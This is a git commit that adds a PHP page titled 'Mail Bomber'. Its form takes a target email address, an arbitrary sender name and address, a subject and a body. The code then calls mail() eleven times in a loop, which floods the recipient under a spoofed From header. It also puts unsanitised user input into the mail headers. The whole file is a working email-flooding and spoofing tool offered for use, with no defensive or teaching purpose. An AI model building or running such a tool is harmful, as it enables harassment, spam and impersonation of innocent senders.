51709a502c33488708a28a5ffaa2ab8c55d9a77a
adityaarora31 <adityaarora31@users.noreply.github.com>
2017-07-09 16:11:46 +0530

    Add files via upload

---
+++ mailbomb.php
@@ -0,0 +1,37 @@
+<html>
+<head>
+<title> Mail Bomber </title>
+</head>
+<body>
+<form action="mailbomb.php" method="post">
+<h3>To Mail : </h3> <input type="text" name="email" size="30"><br>
+<h3>Sender Name : </h3> <input type="text" name="name" size="30"><br>
+<h3> Sender Mail: </h3> <input type="text" name="mail" size="30"><br>
+<h3> Subject : </h3> <input type="text" name="subject" size="30"><br>
+<h3> Content : </h3> <textarea rows=10 cols=30 name="content"> </textarea><br> 
+<input type="submit" value="Send" name="button">
+</form>
+</body>
+</html>
+
+
+<?php
+
+if(isset($_POST['button']))
+{
+$to_email=$_POST['email'];
+$name=$_POST['name'];
+$sender_mail=$_POST['mail'];
+$subject=$_POST['subject'];
+$content=$_POST['content'];
+$header="From: $name"."<$sender_mail>\r\n";
+for($x=0; $x<=10 ; $x++)
+{
+mail($to_email,$subject,$content,$header);
+}
+echo "Sent Successfully";
+
+}
+
+
+?>
